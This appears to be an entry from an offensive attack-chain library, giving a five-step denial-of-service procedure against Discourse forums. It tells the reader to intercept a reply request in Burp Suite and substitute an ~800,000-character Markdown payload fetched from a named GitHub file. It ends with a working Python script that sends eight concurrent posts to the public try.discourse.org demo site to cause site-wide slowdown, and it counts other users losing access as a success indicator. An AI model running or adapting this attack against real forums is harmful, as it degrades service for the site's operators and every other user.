---
id: ac-uuid-12345
tags:
  - dos
  - resource-exhaustion
  - discourse
  - markdown
  - web
type: attack_chain
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/Python]]'
tactics:
  - '[[Impact]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Authenticate-to-Discourse-Forum]]'
  - '[[procedures/Navigate-to-Target-Topic]]'
  - '[[procedures/Inject-Large-Markdown-Payload-via-Interception]]'
  - '[[procedures/Repeat-Request-to-Trigger-Delay]]'
  - '[[procedures/Automate-Concurrent-Requests-for-Amplified-DoS]]'
step_count: 5
techniques:
  - '[[Network Denial of Service]]'
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:55.816Z'
description: >-
  A multi-step attack exploiting Discourse's reply endpoint to cause resource
  exhaustion through large Markdown payloads, leading to server delays and
  potential site-wide downtime.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
  - '[[Endpoint Denial of Service]]'
---
# Application-Level DoS in Discourse via Large Markdown Payload in Reply Section

Multi-stage attack chain demonstrating a complete DoS workflow against Discourse forums by overwhelming the backend with excessive Markdown processing in reply submissions.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access: Login] --> B[Positioning: Navigate Topic]
    B --> C[Execution: Inject Payload]
    C --> D[Validation: Repeat Request]
    D --> E[Amplification: Concurrent Requests]
    E --> F[Impact: Resource Exhaustion]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#f39c12
    style E fill:#3498db
    style F fill:#e74c3c
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]
- [[tools/Python]]

### Target Environment

- Web platform with Discourse forum (Ruby on Rails backend)
- Required services: HTTP/2-enabled web server
- Network access: Direct internet access to target forum (e.g., https://try.discourse.org)

### Initial Access Requirements

- Valid user credentials for the Discourse forum
- No elevated privileges needed; standard user account suffices
- Browser or proxy tool for request interception

## Detailed Attack Procedures

### Step 1: Authenticate to Discourse Forum
procedure: [[procedures/Authenticate-to-Discourse-Forum]]

**Objective**: Gain authenticated access to the target Discourse instance to enable reply submissions.

**Instructions**: Open a browser and navigate to the Discourse demo site. Enter valid login credentials to authenticate.

**Expected Output**: Successful login redirect to the forum dashboard, with session cookies established.

**Success Indicators**:
- User profile accessible without re-authentication
- Ability to view and interact with topics

### Step 2: Navigate to Target Topic
procedure: [[procedures/Navigate-to-Target-Topic]]

**Objective**: Position within the forum to access a reply endpoint for payload injection.

**Instructions**: After login, browse to the default welcome topic posted by discobot (e.g., the initial greetings message).

**Expected Output**: Topic page loads, displaying the post with a reply input field.

**Success Indicators**:
- Topic content visible
- Reply button or composer available

### Step 3: Inject Large Markdown Payload via Interception
procedure: [[procedures/Inject-Large-Markdown-Payload-via-Interception]]

**Objective**: Modify the reply request to include an oversized Markdown payload, triggering excessive server-side processing.

**Instructions**: Configure [[tools/Burp-Suite]] as a proxy. Attempt to submit a reply in the topic composer, intercept the POST request (to endpoint like /t/:id/posts), and replace the content with a ~800,000 character Markdown payload from https://github.com/theteatoast/theteatoast.github.io/blob/main/payload.txt. Forward the modified request.

**Expected Output**: Server processes the request, potentially with initial success or delay.

**Success Indicators**:
- Modified request sent successfully
- Payload size confirmed in request body

### Step 4: Repeat Request to Trigger Delay
procedure: [[procedures/Repeat-Request-to-Trigger-Delay]]

**Objective**: Resend the large payload to observe and confirm the resource exhaustion effect on the server.

**Instructions**: Using the intercepted request in [[tools/Burp-Suite]], resend it multiple times. Monitor response times and status codes.

**Expected Output**: Each resend causes ~30 seconds delay, followed by HTTP/2 502 Bad Gateway error.

**Success Indicators**:
- Response time exceeds 30 seconds
- 502 error received, indicating backend overload

### Step 5: Automate Concurrent Requests for Amplified DoS
procedure: [[procedures/Automate-Concurrent-Requests-for-Amplified-DoS]]

**Objective**: Scale the attack to overwhelm the entire application, affecting unrelated endpoints and causing site-wide impact.

**Instructions**: Use a Python script to send 7-8 parallel requests with the large payload. Simultaneously, monitor an unrelated endpoint like /latest (anonymously) for delays.

Execute [[commands/python-discourse-dos-script]]:

```python
import requests
import threading
import time

def send_payload():
    payload = open('payload.txt', 'r').read()  # ~800k chars from GitHub
    data = {'post[raw]': payload}
    session = requests.Session()
    session.post('https://try.discourse.org/t/welcome-to-discourse/1/posts', data=data, cookies={'_forum_session': 'your_session_cookie'})

threads = []
for _ in range(8):
    t = threading.Thread(target=send_payload)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

# Monitor /latest
start = time.time()
requests.get('https://try.discourse.org/latest')
print(f'Response time: {time.time() - start} seconds')
```

**Expected Output**: Concurrent requests cause ~30 second delays on /latest (vs. normal 1-2 seconds), leading to widespread slowdown.

**Success Indicators**:
- Delays observed on unrelated endpoints
- Potential full site downtime for other users

## Attack Chain Summary

### Key Achievements

1. Successful injection of large payload causing single-request exhaustion
2. Confirmation of ~30 second processing delays and 502 errors
3. Amplified impact via concurrency, degrading entire forum availability

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Network Denial of Service]] Network Denial of Service
- [[Endpoint Denial of Service]] Endpoint Denial of Service

### MITRE ATT&CK Tactics

- [[Impact]] Impact

---
*Last updated: 2023-10-01T00:00:00Z*
